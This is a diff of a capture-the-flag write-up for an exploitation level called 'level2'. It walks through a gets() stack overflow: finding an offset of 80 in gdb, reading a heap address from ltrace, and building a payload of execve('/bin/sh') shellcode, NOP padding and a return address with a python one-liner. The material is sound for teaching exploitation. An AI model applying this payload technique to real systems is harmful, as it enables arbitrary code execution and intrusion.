@@ -31,21 +31,11 @@ $> objdump -d level2
 # and like previous level, it use gets() to get input from user
 ```
 
-We know this level use gets() as previous level, so we can do the same thing as previous level.  
+We know this level use gets() as previous level, so we can do the same thing.  
 But here don't called to launch a shell.  
 We can insert a [shellcode](http://shell-storm.org/shellcode/files/shellcode-575.php) (execve("/bin/sh")) into the program.  
 
 ```shell
-$> gdb level2
-(gdb) r
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-
-Program received signal SIGSEGV, Segmentation fault.
-0x37634136 in ?? ()
-
-# the offset is 80
-
 $> gdb level2
 (gdb) set disassembly-flavor intel
 (gdb) disas p
@@ -63,6 +53,16 @@ $> gdb level2
 # so we can't stock the shellcode in the stack
 # but we can use heap or the address where eax is called to insert the shellcode .
 
+$> gdb level2
+(gdb) r
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
+# the offset is 80
+
 $> ltrace ./level2
 [...]
 strdup("") = 0x0804a008
@@ -71,7 +71,7 @@ strdup("") = 0x0804a008
 # heap address is 0x804a008
 # us shellcode contents 21 bytes (\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80)
 
-$> vi
+$> python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\x90' * (80 - 21) + '\x08\xa0\x04\x08'" > /tmp/exploit
 
 # '\x6a[...]\x80'       : shellcode
 # '\x90'                : NOP (no operation)
